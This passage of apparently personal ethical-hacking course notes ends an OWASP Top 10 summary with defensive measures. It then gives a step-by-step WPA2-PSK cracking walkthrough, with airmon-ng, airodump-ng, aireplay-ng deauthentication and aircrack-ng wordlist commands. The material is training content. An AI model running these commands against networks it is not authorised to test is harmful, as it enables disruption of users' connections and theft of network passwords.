<li data-line="37">Use of segmented application architecture to minimize risks.</li>
<li data-line="38">Deploy minimal platforms and remove unused features and services.</li>
</ul>
</li>
<li data-line="40"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Vulnerable and Outdated Components</strong><br>
Modern <em>distributed</em> web applications often incorporate open source components such as <em>libraries</em> and <em>frameworks</em>. Any component with a known vulnerability becomes a <em>weak link</em> that can impact the security of the entire application. It is <em>#1</em> when ranking the OWASP Top 10 by how often a vulnerability was the <em>root cause</em> of an actual data breach.</p>
<p> <mark><strong>Defenses</strong>:</mark></p>
<ul>
<li data-line="44">Continuous scanning of all code components for known vulnerabilities.</li>
<li data-line="45">Company’s frameworks should be under configuration management.</li>
<li data-line="46">Patch management workflows for identifying and deploying the right patch.</li>
</ul>
</li>
<li data-line="48"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Identification and Authentication Failures</strong><br>
When applications incorrectly execute functions related to session management or user authentication, intruders may be able to compromise <em>passwords</em>, <em>security keys</em>, or <em>session tokens</em> and permanently or temporarily assume the identities and permissions of other users. This can give attackers unintended access and can also severely compromise other assets connected to the same network.</p>
<p>  <mark><strong>Defenses</strong>:</mark></p>
<ul>
<li data-line="52">Implement <em>multi-factor</em> authentication.</li>
<li data-line="53">Enforce strong passwords and avoid using default credentials.</li>
<li data-line="54">Carefully monitor failed login attempts.</li>
</ul>
</li>
<li data-line="56"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Software and Data Integrity</strong><br>
Code and infrastructure that do not guard against <em>integrity violations</em>, often referred to as <em>software</em> and <em>data integrity</em> failures. A program that uses <em>plugins</em>, <em>libraries</em>, or <em>modules</em> from untrusted sources, repositories, or content delivery networks (<em>CDNs</em>) is an example of this. Unauthorized access, malicious code, or system compromise can all be risks of an unsecured <em>CI/CD</em> pipeline.</p>
<p>  <mark><strong>Defenses</strong>:</mark></p>
<ul>
<li data-line="60">Use of digital signatures to avoid data tampering.</li>
<li data-line="61">Introduce review procedure for code and configuration modifications.</li>
<li data-line="62">Make sure your <em>CI/CD</em> pipeline includes adequate segregation.</li>
</ul>
</li>
<li data-line="64"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Insufficient Logging and Monitoring</strong><br>
It is estimated that the time from attack to detection can take up to <em>200 days</em>, and often longer. In the meantime, attackers can <em>tamper</em> with servers, <em>corrupt</em> databases, and <em>steal</em> confidential information. Insufficient <em>logging</em> and ineffective integration of the security systems allow attackers to pivot to other systems and maintain persistent threats.</p>
<p>  <mark><strong>Defenses</strong>:</mark></p>
<ul>
<li data-line="68">Implementing logging and audit software.</li>
<li data-line="69">Establishing an effective monitoring system.</li>
<li data-line="70">Thinking like an attacker and use a pen testing approach.</li>
</ul>
</li>
<li data-line="72">
<p><strong>Server-Side Request Forgery</strong><br>
Server-side request forgery(also termed as <em>SSRF</em>) is a web security flaw that allows an attacker to force a <em>server-side</em> application to send <em>HTTP</em> requests to any <em>domain</em> the attacker chooses. When a web application fetches a remote resource without <em>validating</em> the user-supplied URL, an <em>SSRF fault</em> occurs.</p>
<p>  <mark><strong>Defenses</strong>:</mark></p>
</li>
</ol></div><div><ul>
<li data-line="0">Implement input validation and use Regular Expressions (<em>RegEx</em>).</li>
<li data-line="1">Only accept the intended IP address format (IPv4 or IPv6).</li>
<li data-line="2">Validate incoming Domain Names.</li>
</ul></div></div></div><div class="heading-wrapper"><h1 data-heading="Wireless Penetration Testing" class="heading" id="Wireless_Penetration_Testing">Wireless Penetration Testing</h1><div class="heading-children"><div><p>This includes a very brief introduction to <strong>WiFi hacking</strong> and penetration testing. The <mark><strong>Learn Ethical Hacking From Scratch</strong></mark> course by <strong>zSecurity</strong> teaches much better and detailed WiFi hacking techniques. </p></div><div><ol>
<li data-line="0">Here we will hack the most popular <strong>WPA PSK2</strong> security protocol. We start by killing any background processes that may interfere with our Wifi card using <code>airmon-ng check kill</code>. Now, by default our wifi card is in <em>station mode</em> so that we connect to various different <em>Access Points</em>(AP). We will change that and place it in <em>monitor mode</em>, so to discover all other devices in the <em>vicinity</em> and get various details like AP's BSSID, network strength, devices connected etc. We achieve this using <code>airmon-ng start wlan0</code>.<br>
<span alt="Screenshot (79).png" src="Screenshot (79).png" class="internal-embed media-embed image-embed is-loaded"><img alt="Screenshot (79).png" src="screenshot-(79).png"></span></li>
<li data-line="2">Now after placing our wifi card into monitor mode and it will change from <code>wlan0</code> to <code>wlan0mon</code>. This will indicates a <em>successfull change</em>. Now, we start the <em>discovery process</em>. To list all the various AP's in range we use the command <code>airodump-ng wlan0mon</code>. This will show all the wireless <em>AP's</em> in range and show various details about them.<br>
<span alt="Screenshot (80).png" src="Screenshot (80).png" class="internal-embed media-embed image-embed is-loaded"><img alt="Screenshot (80).png" src="screenshot-(80).png"></span></li>
<li data-line="4">Next step is selecting the network we want to attack. We will note down its BSSID and specify this network during discovery. We will use <code>airodump-ng  -c 6 --bssid 50:C7:8A:44:2A:73 -w ./Desktop/capture wlan0mon</code>. This will monitor the network specified and data being transmitted. The captured data will stored at the location specified using <code>-w</code> parameter.<br>
<span alt="3.png" src="3.png" class="internal-embed media-embed image-embed is-loaded"><img alt="3.png" src="3.png"></span></li>
<li data-line="6">Now we will use a deauthentication attack to forcefully disconnect the connected devices to the AP. When they reconnect, we will capture the <strong>EAPOL</strong> handshake packet which contains the AP's <em>pre-shared security key</em>. We can do this using command <code>aireplay-ng -0 1 -a &lt;AP BSSID&gt; &lt;Device BSSID&gt; wlan0mon</code>. This will send <em>deauth</em> packets to both the AP and connected device. If we don't specify the <code>&lt;Device BSSID&gt;</code> then it will broadcast a general deauth packet to all devices but this is much <em>slower</em>.<br>
<span alt="A.png" src="A.png" class="internal-embed media-embed image-embed is-loaded"><img alt="A.png" src="a.png"></span><br>
<span alt="B.png" src="B.png" class="internal-embed media-embed image-embed is-loaded"><img alt="B.png" src="b.png"></span></li>
<li data-line="9">Now we will crack this captured <em>WPA handshake</em> PSK using <code>aircrack-ng -w wordlist.txt -b &lt;AP BSSID&gt; capture-01.cap</code>. This will give us the <em>AP's</em> <strong>password</strong>. Now, the problem is the success of this attack is entirely dependent on <em>strength of password</em> used. If its a <em>complex</em> password with <em>uncommon</em> keywords then there is very little chance we could crack it using a <em>wordlist</em> or <em>dictionary</em> attacks. Of course we can try <em>brute-forcing</em> but that could take months, years, decades or centuries depending on password strength.<br>
<span alt="C.png" src="C.png" class="internal-embed media-embed image-embed is-loaded"><img alt="C.png" src="c.png"></span><br>
</li>
</ol></div><div class="mod-footer"></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Networking Refresher"><div class="tree-item-contents heading-link" heading-name="Networking Refresher"><span class="tree-item-title">Networking Refresher</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Introduction_to_Linux"><div class="tree-item-contents heading-link" heading-name="Introduction to Linux"><span class="tree-item-title">Introduction to Linux</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Introduction_to_Python"><div class="tree-item-contents heading-link" heading-name="Introduction to Python"><span class="tree-item-title">Introduction to Python</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#The_Ethical_Hacker_Methodology"><div class="tree-item-contents heading-link" heading-name="The Ethical Hacker Methodology"><span class="tree-item-title">The Ethical Hacker Methodology</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Information_Gathering_(Reconnaissance)"><div class="tree-item-contents heading-link" heading-name="Information Gathering (Reconnaissance)"><span class="tree-item-title">Information Gathering (Reconnaissance)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Scanning_&amp;_Enumeration"><div class="tree-item-contents heading-link" heading-name="Scanning &amp; Enumeration"><span class="tree-item-title">Scanning &amp; Enumeration</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Exploitation_Basics"><div class="tree-item-contents heading-link" heading-name="Exploitation Basics"><span class="tree-item-title">Exploitation Basics</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#New_Capstone"><div class="tree-item-contents heading-link" heading-name="New Capstone"><span class="tree-item-title">New Capstone</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Introduction_to_Exploit_Development"><div class="tree-item-contents heading-link" heading-name="Introduction to Exploit Development"><span class="tree-item-title">Introduction to Exploit Development</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Active_Directory_Overview"><div class="tree-item-contents heading-link" heading-name="Active Directory Overview"><span class="tree-item-title">Active Directory Overview</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Active_Directory_Lab_Build"><div class="tree-item-contents heading-link" heading-name="Active Directory Lab Build"><span class="tree-item-title">Active Directory Lab Build</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Active_Directory_-_Initial_Attack_Vectors"><div class="tree-item-contents heading-link" heading-name="Active Directory - Initial Attack Vectors"><span class="tree-item-title">Active Directory - Initial Attack Vectors</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Active_Directory_-_Post_Compromise_Enumeration"><div class="tree-item-contents heading-link" heading-name="Active Directory - Post Compromise Enumeration"><span class="tree-item-title">Active Directory - Post Compromise Enumeration</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Active_Directory_-_Post_Compromise_Attacks"><div class="tree-item-contents heading-link" heading-name="Active Directory - Post Compromise Attacks"><span class="tree-item-title">Active Directory - Post Compromise Attacks</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Post_Exploitation"><div class="tree-item-contents heading-link" heading-name="Post Exploitation"><span class="tree-item-title">Post Exploitation</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Web_Application_Enumeration:_Revisited"><div class="tree-item-contents heading-link" heading-name="Web Application Enumeration: Revisited"><span class="tree-item-title">Web Application Enumeration: Revisited</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Top_10_Web_Application_Vulnerabilities"><div class="tree-item-contents heading-link" heading-name="Top 10 Web Application Vulnerabilities"><span class="tree-item-title">Top 10 Web Application Vulnerabilities</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="index.html#Wireless_Penetration_Testing"><div class="tree-item-contents heading-link" heading-name="Wireless Penetration Testing"><span class="tree-item-title">Wireless Penetration Testing</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>
